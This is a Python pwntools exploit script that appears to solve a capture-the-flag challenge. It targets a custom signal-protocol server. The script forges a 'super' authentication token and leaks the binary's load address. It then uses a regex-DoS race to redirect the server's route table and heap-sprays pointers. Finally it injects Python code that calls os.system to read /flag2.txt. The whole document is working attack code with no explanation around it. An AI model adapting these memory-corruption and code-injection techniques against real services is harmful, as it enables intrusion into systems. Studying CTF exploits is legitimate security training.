from pwn import *

p64 = util.packing.p64


host = "xn--sg8h.shellweplayaga.me"
port = 10001


exe = ELF('./🌌')

if args.REMOTE:
	r = remote('localhost', '1337')
else:
	r = process('./🌌')


def sendsignal(data):
	r.sendline(data)

def rcvsignal():
	res = r.recvuntil(b"[$Signal]").decode()
	if "Deadend" in res:
		r.interactive()
	return res

def authenticate_as_super():
	sendsignal(f"reg|ù".encode())
	res = rcvsignal()
	session_token = res.split("[Register][Token]")[-1].split("[$Token][$Register]")[0]
	data = b"auth|" + session_token.encode() + b'{"ident":"super"}'
	sendsignal(data)
	r.recvuntil(b"authenticated")
	print('[+] Authenticated as super')

def index():
	sendsignal(b"index|")
	res = rcvsignal()

if __name__ == "__main__":
	authenticate_as_super()

	# Flag 1
	r.sendlineafter(b'[Enquiry]', b'flag1|')
	r.recvuntil(b'[Flag1]')
	flag1 = r.recvuntil(b'[$Flag1]', drop=True).decode()
	print(flag1)


	r.sendlineafter(b'[Enquiry]', b'inspect|')
	r.recvuntil(b'route index at ')
	index_addr = int(r.recvuntil(b'>', drop=True), 16)
	success(f'{hex(index_addr)=}')

	index_fn = exe.sym['main::index(server::Server&,server::Request,server::Response)']
	exe.address = index_addr - index_fn
	success(f'{hex(exe.address)=}')

	g_routes = exe.sym['server::g_routes']
	success(f'{hex(g_routes)=}')

	hijack_cmd_str = next(exe.search(b'system\0'))
	success(f'{hex(hijack_cmd_str)=}')

	eval_fn = exe.sym['util::py_get_builtin_type(stdlib::builtin::string::String)']
	success(f'{hex(eval_fn)=}')

	r.sendlineafter(b'[Enquiry]', b'clear|')
	r.sendlineafter(b'[Enquiry]', b'col|1,c')
	r.sendlineafter(b'[Enquiry]', b'ingest|0,'+b'b'*50)

	payload = flat(
		p64(eval_fn),
		p64(hijack_cmd_str),
		p64(7), p64(7),
	)
	if b'\n' in payload or b',' in payload:
		raise ValueError('Payload contains invalid characters')

	payload = flat(
		b'deflect|',
		b'^$|(bb|b.)*a', # RE-dos filter
		b',', payload, # Exploit will point g_routes to fake_route's data
		b',0,0' * 3, # Accessing 0,0 will delay the coroutine
		b',19,', b"20869", # Offet into the heap spray
	)
	r.sendlineafter(b'[Enquiry]', payload)

	r.sendlineafter(b'[Enquiry]', b'col|20,' + b',e'*21)
	payload2 = p64(0)
	payload2 += (p64(g_routes) + p64(0)) * ((0x80 * 0x1000) // 8)
	if b'\n' in payload2 or b',' in payload2:
		raise ValueError('Payload contains invalid characters')
	r.sendlineafter(b'[Enquiry]', b'name|' + payload2)

	payload3 = b'"__import__(\"os\").system(\"cat /flag2.txt\")#"'
	r.sendlineafter(b'[Enquiry]', b'name|' + payload3)

	r.sendlineafter(b'[Enquiry]', b'system|0,0')

	r.interactive()
